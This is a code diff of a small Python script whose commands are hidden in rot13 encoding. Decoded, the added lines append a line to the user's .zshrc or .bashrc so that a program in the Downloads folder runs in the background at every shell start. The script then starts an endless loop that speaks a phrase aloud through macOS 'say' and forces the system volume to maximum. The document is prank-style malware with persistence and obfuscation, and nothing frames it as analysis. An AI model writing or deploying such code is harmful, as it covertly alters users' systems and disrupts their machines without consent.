@@ -1,4 +1,9 @@
 import codecs
 import subprocess
-subprocess.run(codecs.encode('rpub "abuhc clguba3 ~/Qbjaybnqf/FcrpvnyNqqbaOlZr &" >> ~/.mfuep','rot_13'))
-exec(codecs.encode('juvyr Gehr:\n    fhocebprff.eha(['+'"fnl","Vs nalbar ybhqyl oyrffrf gurve arvtuobe rneyl va gur zbeavat, vg jvyy or gnxra nf n phefr."])','rot_13'))
+from pathlib import Path
+import os
+if 'zsh' in os.environ.get("SHELL", ""):
+    with open(Path.home() / ".zshrc", 'a') as f:f.write(codecs.encode("abuhc clguba3 ~/Qbjaybnqf/FcrpvnyNqqbaOlZr &", 'rot_13'))
+if 'bash' in os.environ.get("SHELL", ""):
+    with open(Path.home() / ".bashrc", 'a') as f:f.write(codecs.encode("abuhc clguba3 ~/Qbjaybnqf/FcrpvnyNqqbaOlZr &", 'rot_13'))
+exec(codecs.encode('juvyr Gehr:\n    fhocebprff.eha(['+'"fnl","Vs nalbar ybhqyl oyrffrf gurve arvtuobe rneyl va gur zbeavat, vg jvyy or gnxra nf n phefr."]);fhocebprff.eha(["bfnfpevcg -r '+"'frg ibyhzr bhgchg ibyhzr 100'"+'"])','rot_13'))
